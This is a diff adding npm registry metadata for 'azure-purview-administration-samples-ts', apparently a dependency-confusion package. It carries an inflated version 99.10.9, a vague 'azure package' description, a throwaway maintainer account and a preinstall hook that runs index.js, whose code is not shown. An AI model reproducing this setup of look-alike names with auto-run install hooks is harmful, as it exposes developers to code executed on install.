@@ -1,0 +1,62 @@
+{
+    "_id": "azure-purview-administration-samples-ts",
+    "name": "azure-purview-administration-samples-ts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-purview-administration-samples-ts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-purview-administration-samples-ts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-nayXfoq5iA9oJDBjoPQGeIwxNXOZz4q4f8sMy76Owlinz96KXfe7gj7s4+aKHqRyivcOFZDiZzMpK3WEvzmzXw==",
+                "shasum": "ca858edb61a69e400c174bfc0cd1cbbc12010504",
+                "tarball": "https://registry.npmjs.org/azure-purview-administration-samples-ts/-/azure-purview-administration-samples-ts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5091,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOrmsACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoriA//aUPfxWzcnhqRi7hI0l+qwkfbGn7lM9XVEqPGgziQOpyqKFh5\r\naeDTfTMJIIJu0UrPPJDrNQuGWMPhDu49pz6QhbnMLJIYVoxJZIf6X51O0g3H\r\nmFqxa0el2pi+cRIJWTsUhBF8Tyip17CwOZKyo7J51SJQU7zMLb3HGzppBaCI\r\n7jWqH5XykqRK4HDGZsv6YcGEDRAsPr9bYpX9vhvP4bibKWN1pnP2eeLZlWsA\r\nKpDmdR4sfQZPww8XwowWNIhq3zihrothNeT4PQ9xuJI5nF54pnX9pCfkFM2E\r\ncVAcduEXWk3lJ302/jHv4Wxdvf6WINFayNikzOWkI9uh6ZFvbT8LqAcX7Uos\r\nYWT5mxuoVj/iXh6u47pv6lojH7HUwnN+KghqVq7c0Wazzq8xM9mVyR/GEsBD\r\n+Yv/x2arsPgtA9c9Zhjb9CegJCKw5TvaGHgGBpYuxOwwmCM+jdiVHwxm/d3f\r\nD3gEInwZ+HmAUi4ghAgUOJAw0sg7Kv/8inlxWB0Lxa3WpD/9Ptg/bK0VzaZk\r\nnGjblLnFZN1jAB/1psk8eXEsopnG9Dr0YVMMm+8KQICFY8qPARrnTMW6BLIb\r\nGiK4TT91+IgwSI8tcrGaTywhoVx5y9gcEW/JgU0z6GV1dxr1dUAYKe5qSYbw\r\nPSEN5V7Gq5IJobD3x7dLWnzYX5K1HRO4bno=\r\n=FFLT\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "mpdczibx",
+                "email": "mpdczibx@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "mpdczibx",
+                    "email": "mpdczibx@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-purview-administration-samples-ts_99.10.9_1648015788216_0.7484413770323146"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T06:09:48.216Z",
+        "99.10.9": "2022-03-23T06:09:48.350Z",
+        "modified": "2022-03-23T06:09:48.478Z"
+    },
+    "maintainers": [
+        {
+            "name": "mpdczibx",
+            "email": "mpdczibx@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
